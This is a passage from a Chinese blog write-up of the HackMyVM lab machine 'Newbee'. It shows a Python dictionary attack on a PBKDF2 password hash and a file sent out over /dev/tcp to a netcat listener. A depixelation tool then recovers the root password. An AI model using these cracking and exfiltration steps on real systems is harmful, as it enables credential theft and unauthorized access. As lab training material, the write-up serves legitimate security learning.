PBKDF2 哈希</span></span><br><span class="line">iterations = <span class="number">50500</span>  <span class="comment"># 迭代次数</span></span><br><span class="line">hash_length = <span class="number">60</span>  <span class="comment"># 哈希长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取字典文件并尝试破解</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dictionary_attack</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/Users/kakeru/tools/字典/password.lst&quot;</span>, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> password <span class="keyword">in</span> f:</span><br><span class="line">            password = password.strip()</span><br><span class="line">            hash_attempt = hashlib.pbkdf2_hmac(<span class="string">&quot;sha256&quot;</span>, password.encode(), salt, iterations, dklen=hash_length)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> hash_attempt == hash_stored:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 找到密码: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] 失败: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到匹配的密码&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行爆破</span></span><br><span class="line">dictionary_attack()</span><br></pre></td></tr></table></figure></div>
+<p>得到密码<code>1qaz2wsx</code> 然后把这个密码md5一下</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:~/.secret$ echo -n &quot;1qaz2wsx&quot; | md5sum</span><br><span class="line">1c63129ae9db9c60c3e8aa94d3e00495  -</span><br><span class="line">debian@Newbee:~/.secret$ unzip password.zip </span><br><span class="line">Archive:  password.zip</span><br><span class="line">[password.zip] password.png password: </span><br><span class="line">error:  cannot create password.png</span><br><span class="line">        Permission denied</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>但是无法创建文件，所以先把password.zip文件放在tmp目录下面，然后再解压<br>得到password.zip里面的图片</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:/tmp$ cat password.png  &gt; /dev/tcp/192.168.80.11/1234 </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# nc -lp 1234  &gt; a.png</span><br></pre></td></tr></table></figure></div>
+<p>发现这是一个马赛克，所以搜一下马赛克隐写<br><a target="_blank" rel="noopener" href="https://github.com/spipm/Depixelization_poc">https://github.com/spipm/Depixelization_poc</a></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(base) kakeru<span class="meta">@bogon</span> <span class="type">Depixelization_poc</span><span class="operator">-</span>main <span class="operator">%</span> python3 depix.py \</span><br><span class="line">    <span class="operator">-</span>p <span class="regexp">/Users/</span>kakeru<span class="regexp">/Downloads/</span>a.png \</span><br><span class="line">    <span class="operator">-</span>s images<span class="regexp">/searchimages/</span>debruinseq_notepad_Windows10_closeAndSpaced.png \</span><br><span class="line">    <span class="operator">-</span>o <span class="regexp">/Users/</span>kakeru<span class="regexp">/Downloads/</span>b.png</span><br></pre></td></tr></table></figure></div>
+<p>得到一个b.png 这个虽然解出来还是看不出来，但是发现这是这个项目的示例马赛克，所以得到密码</p>
+<p><code>hellofromtheotherside</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debian@Newbee:/tmp$ su - root</span><br><span class="line">Password: </span><br><span class="line">root@Newbee:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>php伪协议查看文件</li>
+<li>学习jwt攻击</li>
+<li>用ss 看有没有其他开放的端口服务，然后用socat转发</li>
+<li>pbkdf2爆破脚本</li>
+<li>马赛克隐写学习</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>guayu-kakeru
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://guayu-kakeru.github.io/posts/36480.html" title="HMV-Newbee">https://guayu-kakeru.github.io/posts/36480.html</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+              <a href="/tags/HMV/" rel="tag"># HMV</a>
+              <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/46850.html" rel="prev" title="HMV-Chromee WP复现及复盘">
+      <i class="fa fa-chevron-left"></i> HMV-Chromee WP复现及复盘
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#web%E6%8E%A2%E6%B5%8B"><span class="nav-text">web探测</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-text">总结</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1806449041@qq.com" title="E-Mail → 1806449041@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      <i class="fa fa-history fa-fw"></i>
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36480.html" title="posts&#x2F;36480.html">HMV-Newbee</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/46850.html" title="posts&#x2F;46850.html">HMV-Chromee WP复现及复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/37991.html" title="posts&#x2F;37991.html">NSSRound#28web方向wp</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/62478.html" title="posts&#x2F;62478.html">HMV-easypwn WP复现与复盘</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/51504.html" title="posts&#x2F;51504.html">HTTP请求走私漏洞学习</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+      
+      
+        <div class="links-of-blogroll motion-element links-of-blogroll-undefined">
+          <div class="links-of-blogroll-title">
+            <i class="fa fa-history fa-" aria-hidden="true"></i>
+            
+          </div>
+          <ul class="links-of-blogroll-list">
+            
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+              <li class="recent_posts_li">
+                <a href="/" title="" target="_blank"></a>
+              </li>
+            
+          </ul>
+        </div>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
